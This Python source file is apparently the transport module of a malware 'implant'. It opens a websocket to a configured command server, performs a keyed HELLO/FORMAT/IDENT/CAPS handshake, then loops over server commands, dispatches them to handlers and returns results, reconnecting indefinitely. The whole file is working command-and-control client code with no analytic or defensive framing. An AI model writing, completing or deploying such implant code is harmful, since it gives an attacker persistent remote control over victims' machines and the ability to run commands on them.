# implant/transport.py

import asyncio
import logging
import websockets
from websockets.exceptions import ConnectionClosed

import config
import handlers
from capabilities import caps_string

log = logging.getLogger("implant.transport")

_device_id = config.DEVICE_ID


# ── Handshake ─────────────────────────────────────────────────────────────────

async def _expect(ws, prefix: str) -> str:
    raw = await asyncio.wait_for(ws.recv(), timeout=config.HANDSHAKE_TIMEOUT)
    raw = raw.strip()
    log.debug("← %s", raw)
    if not raw.startswith(prefix):
        raise RuntimeError(f"Expected '{prefix}…', got: {raw!r}")
    return raw[len(prefix):]


async def _handshake(ws) -> str:
    global _device_id

    # Stage 1: HELLO
    await ws.send(f"HELLO {config.WS_KEY}")
    log.debug("→ HELLO <ws_key>")
    await _expect(ws, "HELLO_OK")
    log.info("HELLO_OK")

    # Stage 2: FORMAT
    await ws.send(f"FORMAT {config.FORMAT}")
    log.debug("→ FORMAT %s", config.FORMAT)
    await _expect(ws, "FORMAT_OK")
    log.info("FORMAT_OK")

    # Stage 3: IDENT
    ident_payload = _device_id
    await ws.send(f"IDENT {ident_payload}")
    log.debug("→ IDENT %s", ident_payload)
    remainder = await _expect(ws, "IDENT_OK ")
    _device_id = remainder.strip()
    log.info("IDENT_OK device_id=%s", _device_id)

    # Stage 4: CAPS
    caps_cmd = await asyncio.wait_for(ws.recv(), timeout=config.HANDSHAKE_TIMEOUT)
    caps_cmd = caps_cmd.strip()
    log.debug("← %s", caps_cmd)
    if caps_cmd != "CMD caps":
        raise RuntimeError(f"Expected 'CMD caps', got: {caps_cmd!r}")
    await ws.send(f"CMD_OK {caps_string()}")
    log.debug("→ CMD_OK %s", caps_string())
    log.info("Handshake complete")

    return _device_id


# ── Command loop ──────────────────────────────────────────────────────────────

async def _command_loop(ws):
    """
    Server sends:  CMD <cmd_id> <verb> [args…]
    We reply:      CMD_OK <cmd_id> [payload]
                   CMD_FAIL <cmd_id> [reason]
    """
    async for raw in ws:
        raw = raw.strip()
        log.debug("← %s", raw)

        if not raw.startswith("CMD "):
            log.warning("Unexpected frame: %r", raw)
            continue

        # ["CMD", cmd_id, verb, args?]
        parts = raw.split(" ", 3)
        if len(parts) < 3:
            log.warning("Malformed CMD (expected cmd_id + verb): %r", raw)
            continue

        cmd_id = parts[1]
        verb   = parts[2]
        args   = parts[3] if len(parts) == 4 else ""

        log.info("CMD id=%s verb=%s args=%r", cmd_id, verb, args)

        ok, payload = await handlers.dispatch(verb, args)

        if ok:
            reply = f"CMD_OK {cmd_id} {payload}" if payload else f"CMD_OK {cmd_id}"
        else:
            reply = f"CMD_FAIL {cmd_id} {payload}" if payload else f"CMD_FAIL {cmd_id}"

        log.debug("→ %s", reply[:120])
        await ws.send(reply)


# ── Entry point ───────────────────────────────────────────────────────────────

async def run():
    while True:
        log.info("Connecting to %s …", config.WS_URL)
        try:
            async with websockets.connect(config.WS_URL) as ws:
                device_id = await _handshake(ws)
                log.info("Ready — device_id=%s", device_id)
                await _command_loop(ws)

        except ConnectionClosed as exc:
            log.warning("Connection closed: %s", exc)
        except asyncio.TimeoutError:
            log.error("Handshake timed out")
        except RuntimeError as exc:
            log.error("Handshake error: %s", exc)
        except OSError as exc:
            log.error("Connection failed: %s", exc)
        except Exception as exc:
            log.exception("Unexpected error: %s", exc)

        log.info("Reconnecting in %ds …", config.RECONNECT_DELAY)
        await asyncio.sleep(config.RECONNECT_DELAY)